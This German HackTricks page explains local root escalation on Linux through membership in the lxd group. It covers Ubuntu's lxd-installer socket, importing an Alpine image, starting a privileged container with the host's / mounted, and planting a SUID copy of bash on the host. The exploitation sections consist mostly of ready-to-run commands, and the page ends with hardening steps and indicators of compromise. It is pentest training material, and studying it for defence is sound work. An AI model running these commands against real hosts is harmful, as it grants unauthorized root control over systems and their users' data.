# lxd/lxc Group - Rechteausweitung

{{#include ../../../banners/hacktricks-training.md}}

Die Mitgliedschaft in der LXD-Verwaltungsgruppe des Hosts (normalerweise _**lxd**_) kann einen Weg zu Root eröffnen, da sie die vollständige Kontrolle über den Daemon ermöglicht.<sup>[[1]](#references)</sup> Dies ist dasselbe Problem an der Vertrauensgrenze, das für [runtime control sockets](../../containers-namespaces/container-security/runtime-api-and-daemon-exposure.md) und [writable host mounts](../../containers-namespaces/container-security/sensitive-host-mounts.md) beschrieben wird: Der Zugriff auf die Verwaltungs-API kann ausreichen, auch wenn der aktuelle Prozess sich nicht bereits in einem Container befindet.<sup>[[1]](#references)</sup>

## Ubuntu `lxd-installer` Socket-Aktivierung

Gehe nicht davon aus, dass die Mitgliedschaft in `lxd` harmlos ist, nur weil der LXD-Snap fehlt. Unter Ubuntu Server 24.04 und später stellt das vorinstallierte Paket `lxd-installer` `/run/lxd-installer.socket` mit dem Eigentümer `root:lxd` und dem Modus `0660` bereit. Eine Verbindung aktiviert `lxd-installer@.service` als Root, wodurch der LXD-Snap ohne sudo-Passwort oder polkit-Autorisierung installiert wird; bei einigen Wrapper-Versionen wird außerdem die Bestätigungsabfrage übersprungen, wenn die Standardeingabe kein TTY ist.<sup>[[10]](#references)[[11]](#references)</sup>

Untersuche sowohl die Gruppenmitgliedschaft des Kontos als auch den Socket-aktivierten Dienst:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
id -nG
getent group lxd
stat -c '%A %U:%G %n' /run/lxd-installer.socket
systemctl cat lxd-installer.socket lxd-installer@.service
```

Ein autorisierter Test mit der Gruppe `lxd` kann den Installer über den regulären `lxc`-Wrapper aktivieren oder sich direkt mit dem Socket verbinden. Letzteres zeigt, dass die ACL des Unix-Sockets und nicht die Abfrage des Wrappers die tatsächliche Autorisierungsgrenze darstellt:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
python3 -c 'import socket; s=socket.socket(socket.AF_UNIX); s.connect("/run/lxd-installer.socket"); s.send(b"x"); s.recv(1)'
lxc version
```

Once der Daemon verfügbar ist, fahre mit den folgenden Techniken für privilegierte Container fort.<sup>[[10]](#references)[[11]](#references)</sup>

## Ausnutzen ohne Internet

### Methode 1

Du kannst ein Alpine-Image aus einem vertrauenswürdigen Repository herunterladen, um es mit LXD zu verwenden.
Der LXD-Image-Server von Canonical veröffentlicht tägliche Builds: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
Lade einfach sowohl **lxd.tar.xz** als auch **rootfs.squashfs** aus dem neuesten Build herunter (der Verzeichnisname ist das Datum).<sup>[[8]](#references)</sup>

Alternativ kannst du distrobuilder auf deinem Rechner installieren, indem du der [Projektanleitung](https://github.com/lxc/distrobuilder) folgst.<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage    

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```

Lade **incus.tar.xz** (**lxd.tar.xz**, falls du es vom Canonical Image Server heruntergeladen hast) und **rootfs.squashfs** hoch, importiere anschließend das Image und erstelle einen Container.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

> [!CAUTION]
> Wenn dieser Fehler auftritt _**Fehler: Kein Storage-Pool gefunden. Bitte erstellen Sie einen neuen Storage-Pool**_\
> Führen Sie **`lxd init`** aus, richten Sie einen Standard-Storage-Pool ein und **wiederholen** Sie dann den vorherigen Befehlsblock.<sup>[[2]](#references)</sup>

Starten Sie schließlich den Container und öffnen Sie eine Root-Shell auf dem Host-Dateisystem:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

Da UID 0 in dieser privilegierten Instanz nicht neu zugeordnet wird, kann sie über das eingebundene Host-Root-Dateisystem eine dem Host gehörende SUID-Nutzlast erstellen. Dadurch wird der Pivot vom Container zum Host abgeschlossen, statt den Operator in einer Container-Shell zurückzulassen:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
# From the host, write the payload through the privileged container
lxc exec privesc -- /bin/sh -c 'cp /mnt/root/bin/bash /mnt/root/rootbash && chmod 4755 /mnt/root/rootbash'

# Execute on the host; -p prevents bash from dropping the SUID-derived EUID
/rootbash -p
id
```

Platziere den payload auf einem Dateisystem, das SUID unterstützt. Ein separates `/tmp` ist häufig mit `nosuid` eingehängt und erscheint möglicherweise nicht unterhalb einer nicht-rekursiven Bind-Mount von `/`, sodass ein Pfad wie `/rootbash` auf dem Root-Dateisystem des Hosts für diesen Nachweis zuverlässiger ist.<sup>[[10]](#references)[[11]](#references)</sup>

### Methode 2

Erstelle ein Alpine-Image und starte es mit dem Flag `security.privileged=true`, wodurch Container-root auf Host-root abgebildet wird; durch das Mounten von `/` wird das Host-Dateisystem im Container sichtbar.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>

```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

## Hostweiter AppArmor-Nebeneffekt

Beim Starten des LXD-Snaps kann auch `/run/sysctl.d/zz-lxd.conf` geschrieben werden, wodurch `kernel.apparmor_restrict_unprivileged_userns` und `kernel.apparmor_restrict_unprivileged_unconfined` beide auf `0` gesetzt werden. Dadurch werden die Beschränkungen von Ubuntu für User-Namespaces ohne Root-Rechte für alle lokalen Benutzer abgeschwächt. Daher sollten Sie bei der Bewertung des Hosts die Werte vor und nach der Aktivierung von LXD festhalten.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
cat /run/sysctl.d/zz-lxd.conf 2>/dev/null
sysctl kernel.apparmor_restrict_unprivileged_userns \
       kernel.apparmor_restrict_unprivileged_unconfined
```

## Audit und Härtung

Behandle die Mitgliedschaft in `lxd` als Gewährung von Root-Rechten. Das Entfernen eines nicht benötigten Mitglieds wird bei neuen Anmeldesitzungen wirksam. Das Entfernen von `lxd-installer` oder das Maskieren seines Sockets entfernt lediglich den Installationspfad bei Bedarf und schränkt **nicht** die Möglichkeiten eines Benutzers ein, der bereits auf einen installierten LXD-Daemon zugreifen kann.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
getent group lxd
sudo gpasswd -d <user> lxd

# Only if on-demand LXD installation is not required
sudo systemctl mask --now lxd-installer.socket
# or: sudo apt purge lxd-installer
```

Zu den nützlichen Kompromittierungsindikatoren zählen LXD-Instanzen mit `security.privileged=true`, Festplattengeräte, deren `source` `/` ist, unerwartete Verbindungen zu `/run/lxd-installer.socket`, neue SUID-Dateien und ein Wechsel der oben genannten AppArmor-sysctls von `1` zu `0`.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
lxc list
lxc config show <instance> --expanded
find / -xdev -type f -perm -4000 2>/dev/null
```

## References

- [1] [So härten Sie die Sicherheit für LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [LXD-Container und virtuelle Maschinen](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [Images kopieren und importieren](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [Images mit distrobuilder erstellen](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Alpine-Image-Definition](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [lxd-alpine-builder-Build-Skript](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [LXD-Image-Server](https://images.lxd.canonical.com/)
- [9] [Type: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
- [10] [Bericht und PoC zur Privilegieneskalation über die LXD-Gruppe von STAR Labs](https://github.com/star-sg/lxd-group-privesc-report)
- [11] [Alter Wein in neuen Flaschen: Die zehn Jahre alte LXD-Gruppen-Root-Rechteausweitung ist zurück](https://starlabs.sg/blog/2026/06-old-wine-in-a-new-bottle-a-decade-old-lxd-group-root-re-armed)
{{#include ../../../banners/hacktricks-training.md}}
